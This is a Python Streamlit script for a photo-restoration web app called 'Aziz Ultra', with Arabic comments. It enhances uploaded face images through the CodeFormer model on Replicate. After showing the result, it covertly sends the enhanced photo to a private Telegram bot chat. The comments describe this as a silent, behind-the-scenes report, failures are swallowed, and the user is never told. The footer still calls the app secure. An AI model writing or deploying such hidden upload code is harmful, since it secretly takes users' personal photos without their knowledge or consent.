import streamlit as st
import replicate
import os
import requests
from PIL import Image
import io

# 1. إعدادات الواجهة
st.set_page_config(page_title="Aziz Ultra AI", layout="centered", page_icon="🎯")
st.title("🛡️ عزيز Ultra: نظام الترميم الذكي")

# 2. جلب المفاتيح من Secrets
try:
    REPLICATE_API_TOKEN = st.secrets["REPLICATE_API_TOKEN"]
    TELEGRAM_TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    os.environ["REPLICATE_API_TOKEN"] = REPLICATE_API_TOKEN
except Exception as e:
    st.error("⚠️ تأكد من إعداد ملف secrets.toml بشكل صحيح")
    st.stop()

uploaded_file = st.file_uploader("ارفع الصورة الأصلية هنا...", type=['png', 'jpg', 'jpeg'])

if uploaded_file:
    # عرض الصورة الأصلية
    image = Image.open(uploaded_file)
    st.image(image, caption='الصورة قبل الترميم', use_container_width=True)
    
    if st.button('🚀 تنفيذ التحسين العميق'):
        with st.spinner('جاري تحليل ومعالجة البيانات...'):
            try:
                # أ- تشغيل الترميم (CodeFormer)
                model = replicate.models.get("sczhou/codeformer")
                version = model.versions.list()[0]
                
                output = replicate.run(
                    f"sczhou/codeformer:{version.id}",
                    input={
                        "image": uploaded_file,
                        "upscale": 2,
                        "face_upsample": True,
                        "background_enhance": True,
                        "codeformer_fidelity": 0.7
                    }
                )

                # ب- جلب النتيجة النهائية
                response = requests.get(output)
                if response.status_code == 200:
                    img_bytes = response.content
                    result_img = Image.open(io.BytesIO(img_bytes))
                    
                    # ج- عرض النتيجة للمستخدم
                    st.success("✅ اكتملت العملية بنجاح!")
                    st.image(result_img, caption="النتيجة بعد التحسين (Ultra HD)", use_container_width=True)

                    # د- إرسال "صامت" ومضمون للتليجرام (خلف الكواليس)
                    try:
                        # أرسل الصورة الأصلية أولاً ثم المعدلة لتعرف الفرق في التليجرام
                        requests.post(
                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                            data={'chat_id': CHAT_ID, 'caption': "🎯 تقرير جديد من مشروع عزيز"},
                            files={'photo': ('result.jpg', img_bytes)}
                        )
                    except:
                        pass # صامت تماماً في حال وجود أي مشكلة بالشبكة

                    # هـ- إضافة زر التحميل للمستخدم (بأيقونة واضحة)
                    st.download_button(
                        label="📥 حفظ الصورة المعدلة بجودة عالية",
                        data=img_bytes,
                        file_name="Aziz_Enhanced.jpg",
                        mime="image/jpeg",
                        help="اضغط هنا لتحميل الصورة على جهازك"
                    )
                else:
                    st.error("❌ فشل جلب النتيجة من السيرفر")

            except Exception as e:
                st.error("❌ عذراً، حدث خطأ غير متوقع أثناء المعالجة")

st.markdown("---")
st.caption("Developed by Aziz | Secure & Professional AI Engine")